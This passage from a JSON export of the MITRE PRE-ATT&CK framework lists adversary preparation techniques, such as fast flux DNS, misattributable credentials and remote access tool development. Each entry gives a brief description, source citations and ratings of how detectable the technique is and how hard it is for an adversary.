11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Depends on service.  Some are easy to detect, but are hard to trace (e.g., [https:\/\/torproject.org TOR]).","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Easy access to anonymizers, quasi-anonymous services like remailers, [https:\/\/torproject.org TOR], relays, burner phones, etc.","detection":null,"platforms":[]},{"id":38,"name":"T1321 - Common, high volume protocols and software","sort_id":0,"external_id":"T1321","external_sub_id":null,"old_external_id":"PRE-T1098","old_external_sub_id":null,"tactic_id":1,"description":"<p>Certain types of traffic (e.g., Twitter14, HTTP) are more commonly used than others. Utilizing more common protocols and software may make an adversary's traffic more difficult to distinguish from legitimate traffic. (Citation: symantecNITRO)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"High level of entropy in communications.  High volume of communications makes it extremely hard for a defender to distinguish between legitimate and adversary communications.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to decipher or to make the communication less conspicuous.","detection":null,"platforms":[]},{"id":39,"name":"T1312 - Compromise 3rd party infrastructure to support delivery","sort_id":0,"external_id":"T1312","external_sub_id":null,"old_external_id":"PRE-T1089","old_external_sub_id":null,"tactic_id":1,"description":"<p>Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it for some or all of the attack cycle. (Citation: WateringHole2014) (Citation: FireEye Operation SnowMan)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender will not have visibility on 3rd party sites unless target is successfully enticed to visit one.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Commonly used technique currently (e.g., [https:\/\/www.wordpress.com WordPress] sites) as precursor activity to launching attack against intended target (e.g., acquiring botnet or layers of proxies for reducing attribution possibilities).","detection":null,"platforms":[]},{"id":53,"name":"T1324 - DNSCalc","sort_id":0,"external_id":"T1324","external_sub_id":null,"old_external_id":"PRE-T1101","old_external_sub_id":null,"tactic_id":1,"description":"<p>DNS Calc is a technique in which the octets of an IP address are used to calculate the port  for command and control servers from an initial DNS request. (Citation: CrowdstrikeNumberedPanda) (Citation: FireEyeDarwinsAPTGroup) (Citation: Rapid7G20Espionage)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[]},{"id":54,"name":"T1320 - Data Hiding","sort_id":0,"external_id":"T1320","external_sub_id":null,"old_external_id":"PRE-T1097","old_external_sub_id":null,"tactic_id":1,"description":"<p>Certain types of traffic (e.g., DNS tunneling, header inject) allow for user-defined fields. These fields can then be used to hide data. In addition to hiding data in network protocols, steganography techniques can be used to hide data in images or other file formats. Detection can be difficult unless a particular signature is already known. (Citation: BotnetsDNSC2) (Citation: HAMMERTOSS2015) (Citation: DNS-Tunnel)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Unless defender is dissecting protocols or performing network signature analysis on any protocol deviations\/patterns, this technique is largely undetected.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"This technique requires a more advanced protocol understanding and testing to insert covert communication into legitimate protocol fields.","detection":null,"platforms":[]},{"id":76,"name":"T1311 - Dynamic DNS","sort_id":0,"external_id":"T1311","external_sub_id":null,"old_external_id":"PRE-T1088","old_external_sub_id":null,"tactic_id":1,"description":"<p>Dynamic DNS is a method of automatically updating a name in the DNS system. Providers offer this rapid reconfiguration of IPs to hostnames as a service. (Citation: DellMirage2012)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender will not know at first use what is valid or hostile traffic without more context. It is possible, however, for defenders to see if the PTR record for an address is hosted by a known DDNS provider. There is potential to assign some level of risk based on this.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Flexible and re-configurable command and control servers, along with deniable ownership and reduced cost of ownership.","detection":null,"platforms":[]},{"id":80,"name":"T1325 - Fast Flux DNS","sort_id":0,"external_id":"T1325","external_sub_id":null,"old_external_id":"PRE-T1102","old_external_sub_id":null,"tactic_id":1,"description":"<p>A technique in which a fully qualified domain name has multiple IP addresses assigned to it which are swapped with extreme frequency, using a combination of round robin IP address and short Time-To-Live (TTL) for a DNS resource record. (Citation: HoneynetFastFlux) (Citation: MisnomerFastFlux) (Citation: MehtaFastFluxPt1) (Citation: MehtaFastFluxPt2)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[]},{"id":85,"name":"T1314 - Host-based hiding techniques","sort_id":0,"external_id":"T1314","external_sub_id":null,"old_external_id":"PRE-T1091","old_external_sub_id":null,"tactic_id":1,"description":"<p>Host based hiding techniques are designed to allow an adversary to remain undetected on a machine upon which they have taken action. They may do this through the use of  static linking of binaries, polymorphic code, exploiting weakness in file formats, parsers, or self-deleting code. (Citation: VirutAP)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Techniques are difficult to detect and might occur in uncommon use-cases (e.g., patching, anti-malware, anti-exploitation software).","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Some of the host-based hiding techniques require advanced knowledge combined with an understanding and awareness of the target's environment (e.g., exploiting weaknesses in  file formats, parsers and detection capabilities).","detection":null,"platforms":[]},{"id":110,"name":"T1322 - Misattributable credentials","sort_id":0,"external_id":"T1322","external_sub_id":null,"old_external_id":"PRE-T1099","old_external_sub_id":null,"tactic_id":1,"description":"<p>The use of credentials by an adversary with the intent to hide their true identity and\/or portray them self as another person or entity.  An adversary may use misattributable credentials in an attack to convince a victim that credentials are legitimate and trustworthy when this is not actually the case. (Citation: FakeSSLCerts)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Partial","detectable_by_common_defenses_explanation":"If a previous incident identified the credentials used by an adversary, defenders can potentially use these credentials to track the adversary through reuse of the same credentials.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"An adversary can easily create and use misattributable credentials to obtain servers, build environment, [https:\/\/aws.amazon.com AWS] accounts, etc.  Many service providers require some form of identifiable information such as a phone number or email address, but there are several avenues to acquire these consistent with the misattributable identity.","detection":null,"platforms":[]},{"id":111,"name":"T1315 - Network-based hiding techniques","sort_id":0,"external_id":"T1315","external_sub_id":null,"old_external_id":"PRE-T1092","old_external_sub_id":null,"tactic_id":1,"description":"<p>Technical network hiding techniques are methods of modifying traffic to evade network signature detection or to utilize misattribution techniques. Examples include channel\/IP\/VLAN hopping, mimicking legitimate operations, or seeding with misinformation. (Citation: HAMMERTOSS2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Unless defender is dissecting protocols or performing network signature analysis on any protocol deviations\/patterns, this technique is largely undetected.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Some of the hiding techniques require special accesses (network, proximity, physical, etc.) and\/or may rely on knowledge of how the defender operates and\/or awareness on what visibility the defender has and how it is obtained","detection":null,"platforms":[]},{"id":112,"name":"T1316 - Non-traditional or less attributable payment options","sort_id":0,"external_id":"T1316","external_sub_id":null,"old_external_id":"PRE-T1093","old_external_sub_id":null,"tactic_id":1,"description":"<p>Using alternative payment options allows an adversary to hide their activities. Options include crypto currencies, barter systems, pre-paid cards or shell accounts. (Citation: Goodin300InBitcoins)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender likely will not have access to payment information.  Monitoring crypto-currency or barter boards is resource intensive and not fully automatable.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Easy to use pre-paid cards or shell accounts to pay for services online.  Crypto currencies and barter systems can avoid use of trace-able bank or credit apparatus.","detection":null,"platforms":[]},{"id":113,"name":"T1390 - OS-vendor provided communication channels","sort_id":0,"external_id":"T1390","external_sub_id":null,"old_external_id":"PRE-T1167","old_external_sub_id":null,"tactic_id":1,"description":"<p>Google and Apple provide Google Cloud Messaging and Apple Push Notification Service, respectively, services designed to enable efficient communication between third-party mobile app backend servers and the mobile apps running on individual devices. These services maintain an encrypted connection between every mobile device and Google or Apple that cannot easily be inspected and must be allowed to traverse networks as part of normal device operation. These services could be used by adversaries for communication to compromised mobile devices. (Citation: Securelist Mobile Malware 2013) (Citation: DroydSeuss)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"These services are heavily utilized by mainstream mobile app developers.  High volume of communications makes it extremely hard for a defender to distinguish between legitimate and adversary communications.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"These are free services provided by Google and Apple to app developers, and information on how to use them is readily available.","detection":null,"platforms":[]},{"id":114,"name":"T1309 - Obfuscate infrastructure","sort_id":0,"external_id":"T1309","external_sub_id":null,"old_external_id":"PRE-T1086","old_external_sub_id":null,"tactic_id":1,"description":"<p>Obfuscation is hiding the day-to-day building and testing of new tools, chat servers, etc. (Citation: LUCKYCAT2012)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Difficult, but defender is well aware of technique and attempts to find discrepancies.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Adversary has a variety of solutions, ranging in difficulty, that can be employed (e.g., BGP hijacking, tunneling, reflection, multi-hop, etc.)\nAdversary can also use misattributable credentials to obtain servers, build environment, [https:\/\/aws.amazon.com Amazon Web Services] (AWS) accounts, etc.","detection":null,"platforms":[]},{"id":116,"name":"T1318 - Obfuscate operational infrastructure","sort_id":0,"external_id":"T1318","external_sub_id":null,"old_external_id":"PRE-T1095","old_external_sub_id":null,"tactic_id":1,"description":"<p>Obfuscation is hiding the day-to-day building and testing of new tools, chat servers, etc. (Citation: DellComfooMasters)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"While possible to detect given a significant sample size, depending on how the unique identifier is used detection may be difficult as similar patterns may be employed elsewhere (e.g., content hosting providers, account reset URLs).","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"An adversary can easily generate pseudo-random identifiers to associate with a specific target, include the indicator as part of a URL and then identify which target was successful.","detection":null,"platforms":[]},{"id":117,"name":"T1319 - Obfuscate or encrypt code","sort_id":0,"external_id":"T1319","external_sub_id":null,"old_external_id":"PRE-T1096","old_external_sub_id":null,"tactic_id":1,"description":"<p>Obfuscation is the act of creating code that is more difficult to understand. Encoding transforms the code using a publicly available format. Encryption transforms the code such that it requires a key to reverse the encryption. (Citation: CylanceOpCleaver)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Detecting encryption is easy, decrypting\/deobfuscating is hard.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Various solutions exist for the adversary to use.  This technique is commonly used to prevent attribution and evade detection.","detection":null,"platforms":[]},{"id":118,"name":"T1313 - Obfuscation or cryptography","sort_id":0,"external_id":"T1313","external_sub_id":null,"old_external_id":"PRE-T1090","old_external_sub_id":null,"tactic_id":1,"description":"<p>Obfuscation is the act of creating communications that are more difficult to understand.  Encryption transforms the communications such that it requires a key to reverse the encryption. (Citation: FireEyeAPT28)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Techniques and signatures are hard to detect. Advanced communications and exfiltration channels are nearly indistinguishable from background noise.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Known approaches include the use of cryptography for communications, rotating drops sites (such as random list of chat fora), and one-time [https:\/\/aws.amazon.com\/s3\/ Simple Storage Service (S3)] buckets, etc.  All require sophisticated knowledge, infrastructure, and funding.","detection":null,"platforms":[]},{"id":126,"name":"T1305 - Private whois services","sort_id":0,"external_id":"T1305","external_sub_id":null,"old_external_id":"PRE-T1082","old_external_sub_id":null,"tactic_id":1,"description":"<p>Every domain registrar maintains a publicly viewable database that displays contact information for every registered domain. Private 'whois' services display alternative information, such as their own company data, rather than the owner of the domain. (Citation: APT1)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"Algorithmically possible to detect COTS service usage or use of non-specific mailing addresses (PO Boxes, drop sites, etc.)","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Commercially available or easy to set up and\/or register using a disposable email account.","detection":null,"platforms":[]},{"id":128,"name":"T1304 - Proxy\/protocol relays","sort_id":0,"external_id":"T1304","external_sub_id":null,"old_external_id":"PRE-T1081","old_external_sub_id":null,"tactic_id":1,"description":"<p>Proxies act as an intermediary for clients seeking resources from other systems. Using a proxy may make it more difficult to track back the origin of a network communication. (Citation: APT1)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defenders with standard capabilities will traditionally be able to see the first hop but not all the subsequent earlier hops an adversary takes to be able to conduct reconnaissance.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Proxies are readily available for the adversary with both free and cost-based options available.","detection":null,"platforms":[]},{"id":137,"name":"T1317 - Secure and protect infrastructure","sort_id":0,"external_id":"T1317","external_sub_id":null,"old_external_id":"PRE-T1094","old_external_sub_id":null,"tactic_id":1,"description":"<p>An adversary may secure and protect their infrastructure just as defenders do. This could include the use of VPNs, security software, logging and monitoring, passwords, or other defensive measures. (Citation: KrebsTerracottaVPN)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Indistinguishable from standard security practices employed by legitimate operators.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Adversary benefits from our own advances, techniques, and software when securing and protecting their own development infrastructure.","detection":null,"platforms":[]}]},{"id":2,"name":"Build Capabilities","source_name":"PRE_ATT_build-capabilities","sort_id":0,"external_id":"TA0024","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":16,"tactic_id":2},"techniques":[{"id":31,"name":"T1347 - Build and configure delivery systems","sort_id":0,"external_id":"T1347","external_sub_id":null,"old_external_id":"PRE-T1124","old_external_sub_id":null,"tactic_id":2,"description":"<p>Delivery systems are the infrastructure used by the adversary to host malware or other tools used during exploitation. Building and configuring delivery systems may include multiple activities such as registering domain names, renting hosting space, or configuring previously exploited environments. (Citation: APT1)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"It is detectable once deployed to the public Internet, used for adversarial purposes, discovered, and reported to defenders.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"It is easy to create and burn infrastructure. Otherwise, blacklisting would be more successful for defenders.","detection":null,"platforms":[]},{"id":32,"name":"T1349 - Build or acquire exploits","sort_id":0,"external_id":"T1349","external_sub_id":null,"old_external_id":"PRE-T1126","old_external_sub_id":null,"tactic_id":2,"description":"<p>An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. The adversary may use or modify existing exploits when those exploits are still relevant to the environment they are trying to compromise. (Citation: NYTStuxnet) (Citation: NationsBuying)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary will likely use code repositories, but development will be performed on their local systems.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Several exploit repositories and tool suites exist for re-use and tailoring.","detection":null,"platforms":[]},{"id":35,"name":"T1352 - C2 protocol development","sort_id":0,"external_id":"T1352","external_sub_id":null,"old_external_id":"PRE-T1129","old_external_sub_id":null,"tactic_id":2,"description":"<p>Command and Control (C2 or C&amp;C) is a method by which the adversary communicates with malware. An adversary may use a variety of protocols and methods to execute C2 such as a centralized server, peer to peer, IRC, compromised web sites, or even social media. (Citation: HAMMERTOSS2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary will likely use code repositories, but development will be performed on their local systems.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"C2 over commonly used and permitted protocols provides the necessary cover and access.","detection":null,"platforms":[]},{"id":41,"name":"T1354 - Compromise 3rd party or closed-source vulnerability\/exploit information","sort_id":0,"external_id":"T1354","external_sub_id":null,"old_external_id":"PRE-T1131","old_external_sub_id":null,"tactic_id":2,"description":"<p>There is usually a delay between when a vulnerability or exploit is discovered and when it is made public. An adversary may target the systems of those known to research vulnerabilities in order to gain that knowledge for use during a different attack. (Citation: TempertonDarkHotel)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"The compromise of unknown vulnerabilities would provide little attack and warning against a defender, rendering it highly challenging to detect.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Finding, attacking, and compromising a 3rd party or closed vulnerability entity is challenging, because those containing the vulnerabilities should be very aware of attacks on their environments have a heightened awareness.","detection":null,"platforms":[]},{"id":49,"name":"T1345 - Create custom payloads","sort_id":0,"external_id":"T1345","external_sub_id":null,"old_external_id":"PRE-T1122","old_external_sub_id":null,"tactic_id":2,"description":"<p>A payload is the part of the malware which performs a malicious action. The adversary may create custom payloads when none exist with the needed capability or when targeting a specific environment. (Citation: APT1)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"It is likely that an adversary will create and develop payloads on inaccessible or unknown networks for OPSEC reasons.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"Specialized tools exist for research, development, and testing of virus\/malware payloads.","detection":null,"platforms":[]},{"id":51,"name":"T1355 - Create infected removable media","sort_id":0,"external_id":"T1355","external_sub_id":null,"old_external_id":"PRE-T1132","old_external_sub_id":null,"tactic_id":2,"description":"<p>Use of removable media as part of the Launch phase requires an adversary to determine type, format, and content of the media and associated malware. (Citation: BadUSB)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary will likely use code repositories, but development will be performed on their local systems.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Several exploit repositories and tool suites exist for re-use and tailoring.","detection":null,"platforms":[]},{"id":70,"name":"T1350 - Discover new exploits and monitor exploit-provider forums","sort_id":0,"external_id":"T1350","external_sub_id":null,"old_external_id":"PRE-T1127","old_external_sub_id":null,"tactic_id":2,"description":"<p>An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. The adversary may need to discover new exploits when existing exploits are no longer relevant to the environment they are trying to compromise. An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. (Citation: EquationQA)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Public source external to the defender's organization.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Many public sources exist for this information.","detection":null,"platforms":[]},{"id":97,"name":"T1348 - Identify resources required to build capabilities","sort_id":0,"external_id":"T1348","external_sub_id":null,"old_external_id":"PRE-T1125","old_external_sub_id":null,"tactic_id":2,"description":"<p>As with legitimate development efforts, different skill sets may be required for different phases of an attack. The skills needed may be located in house, can be developed, or may need to be contracted out. (Citation: APT1)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Recruitment is, by its nature, either clandestine or off the record.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Like target organizations, adversary organizations are competing to identify and hire top technical talent.  Training less technical staff is also a viable option.","detection":null,"platforms":[]},{"id":123,"name":"T1346 - Obtain\/re-use payloads","sort_id":0,"external_id":"T1346","external_sub_id":null,"old_external_id":"PRE-T1123","old_external_sub_id":null,"tactic_id":2,"description":"<p>A payload is the part of the malware which performs a malicious action. The adversary may re-use payloads when the needed capability is already available. (Citation: SonyDestover)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary will likely use code repositories, but detecting an adversary acquiring a payload would require the defender to be monitoring the code repository where the payload is stored. If the adversary re-uses payloads, this allows the defender to create signatures to detect using these known indicators of compromise (e.g., hashes).","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Several exploit repositories and tool suites exist for re-use and tailoring.","detection":null,"platforms":[]},{"id":125,"name":"T1353 - Post compromise tool development","sort_id":0,"external_id":"T1353","external_sub_id":null,"old_external_id":"PRE-T1130","old_external_sub_id":null,"tactic_id":2,"description":"<p>After compromise, an adversary may utilize additional tools to facilitate their end goals. This may include tools to further explore the system, move laterally within a network, exfiltrate data, or destroy data. (Citation: SofacyHits)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary will likely use code repositories, but development will be performed on their local systems.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Post compromise tool development is a standard part of the adversary's protocol in developing the necessary tools required to completely conduct an attack.","detection":null,"platforms":[]},{"id":131,"name":"T1351 - Remote access tool development","sort_id":0,"external_id":"T1351","external_sub_id":null,"old_external_id":"PRE-T1128","old_external_sub_id":null,"tactic_id":2,"description":"<p>A remote access tool (RAT) is a piece of software that allows a remote user to control a system as if they had physical access to that system. An adversary may utilize existing RATs, modify existing RATs, or create their own RAT. (Citation: ActiveMalwareEnergy)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Adversary will likely use code repositories, but development will be performed on their local systems.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Many successful RATs exist for re-use\/tailoring in addition to those an adversary may choose to build from scratch.  The adversary's capabilities, target sensitivity, and needs will likely determine whether a previous RAT is modified for use a new one is built from scratch.","detection":null,"platforms":[]}]},{"id":3,"name":"Establish & Maintain Infrastructure","source_name":"PRE_ATT_establish-&-maintain-infrastructure","sort_id":0,"external_id":"TA0022","category_id":1,"created_at":"2020-06-26 11:56:00","updated_at":"2020-06-26 11:56:00","pivot":{"framework_stage_id":16,"tactic_id":3},"techniques":[{"id":4,"name":"T1329 - Acquire and\/or use 3rd party infrastructure services","sort_id":0,"external_id":"T1329","external_sub_id":null,"old_external_id":"PRE-T1106","old_external_sub_id":null,"tactic_id":3,"description":"<p>A wide variety of cloud, virtual private services, hosting, compute, and storage solutions are available. Additionally botnets are available for rent or purchase. Use of these solutions allow an adversary to stage, launch, and execute an attack from infrastructure that does not physically tie back to them and can be rapidly provisioned, modified, and shut down. (Citation: TrendmicroHideoutsLease)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Hard to differentiate from standard business operations.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Wide variety of cloud\/VPS\/hosting\/compute\/storage solutions available for adversary to acquire freely or at a low cost.","detection":null,"platforms":[]},{"id":7,"name":"T1330 - Acquire and\/or use 3rd party software services","sort_id":0,"external_id":"T1330","external_sub_id":null,"old_external_id":"PRE-T1107","old_external_sub_id":null,"tactic_id":3,"description":"<p>A wide variety of 3rd party software services  are available (e.g., <a href=\"https:\/\/twitter.com\">Twitter<\/a>, <a href=\"https:\/\/www.dropbox.com\">Dropbox<\/a>, <a href=\"https:\/\/www.google.com\/docs\/about\">GoogleDocs<\/a>). Use of these solutions allow an adversary to stage, launch, and execute an attack from infrastructure that does not physically tie back to them and can be rapidly provisioned, modified, and shut down. (Citation: LOWBALL2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender will not have visibility over account creation for 3rd party software services.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"3rd party services like these listed are freely available.","detection":null,"platforms":[]},{"id":9,"name":"T1332 - Acquire or compromise 3rd party signing certificates","sort_id":0,"external_id":"T1332","external_sub_id":null,"old_external_id":"PRE-T1109","old_external_sub_id":null,"tactic_id":3,"description":"<p>Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Users may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is. (Citation: DiginotarCompromise)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender will not know what certificates an adversary acquires from a 3rd party. Defender will not know prior to public disclosure if a 3rd party has had their certificate compromised.","difficulty_for_adversary":"No","difficulty_for_adversary_explanation":"It is trivial to purchase code signing certificates within an organization; many exist and are available at reasonable cost. It is complex to factor or steal 3rd party code signing certificates for use in malicious mechanisms","detection":null,"platforms":[]},{"id":34,"name":"T1328 - Buy domain name","sort_id":0,"external_id":"T1328","external_sub_id":null,"old_external_id":"PRE-T1105","old_external_sub_id":null,"tactic_id":3,"description":"<p>Domain Names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free. (Citation: PWCSofacy2014)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"Yes","detectable_by_common_defenses_explanation":"This is by design captured in public registration logs.  Various tools and services exist to track\/query\/monitor domain name registration information.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Proliferation of DNS TLDs and registrars.  Adversary may choose domains that are similar to legitimate domains (aka \"domain typosquatting\" or homoglyphs).","detection":null,"platforms":[]},{"id":40,"name":"T1334 - Compromise 3rd party infrastructure to support delivery","sort_id":0,"external_id":"T1334","external_sub_id":null,"old_external_id":"PRE-T1111","old_external_sub_id":null,"tactic_id":3,"description":"<p>Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it for some or all of the attack cycle. (Citation: WateringHole2014) (Citation: FireEye Operation SnowMan)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Defender will not have visibility on 3rd party sites unless target is successfully enticed to visit one.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"Commonly used technique currently (e.g., [https:\/\/www.wordpress.com WordPress] sites) as precursor activity to launching attack against intended target (e.g., acquiring botnet or layers of proxies for reducing attribution possibilities).","detection":null,"platforms":[]},{"id":48,"name":"T1339 - Create backup infrastructure","sort_id":0,"external_id":"T1339","external_sub_id":null,"old_external_id":"PRE-T1116","old_external_sub_id":null,"tactic_id":3,"description":"<p>Backup infrastructure allows an adversary to recover from environmental and system failures. It also facilitates recovery or movement to other infrastructure if the primary infrastructure is discovered or otherwise is no longer viable. (Citation: LUCKYCAT2012)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Infrastructure is (typically) outside of control\/visibility of defender and as such as tools are staged for specific campaigns, it will not be obvious to those being attacked.","difficulty_for_adversary":"Yes","difficulty_for_adversary_explanation":"The adversary has control of the infrastructure and will likely be able to add\/remove tools to infrastructure, whether acquired via hacking or standard computer acquisition (e.g., [https:\/\/aws.amazon.com AWS], commercial storage solutions).","detection":null,"platforms":[]},{"id":74,"name":"T1326 - Domain registration hijacking","sort_id":0,"external_id":"T1326","external_sub_id":null,"old_external_id":"PRE-T1103","old_external_sub_id":null,"tactic_id":3,"description":"<p>Domain Registration Hijacking is the act of changing the registration of a domain name without the permission of the original registrant. (Citation: ICANNDomainNameHijacking)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:00","updated_at":"2020-07-28 16:02:18","is_detectable_by_common_defenses":"No","detectable_by_common_defenses_explanation":"Generally not 